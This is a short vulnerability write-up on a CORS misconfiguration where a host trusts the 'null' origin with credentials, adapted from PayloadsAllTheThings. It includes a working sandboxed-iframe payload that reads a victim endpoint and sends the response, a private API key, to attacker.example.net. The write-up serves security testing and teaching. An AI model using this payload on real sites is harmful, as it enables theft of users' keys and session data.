# Null Origin

## Description 
Host allows requests from `null` origins.

`wwww.example.com` trusts `null`, which can be forged by iframe sandbox scripts

**Severity**: High

## Exploit 
Make requests using a sandboxed iFrame.

### Example

**Vulnerable Implementation** 
```http
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

**Exploit**  
This exploit can be done by putting the attack code into an iframe using the data URI scheme.  
If the data URI scheme is used, the browser will use the `null` origin in the request:

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-example-null-origin)
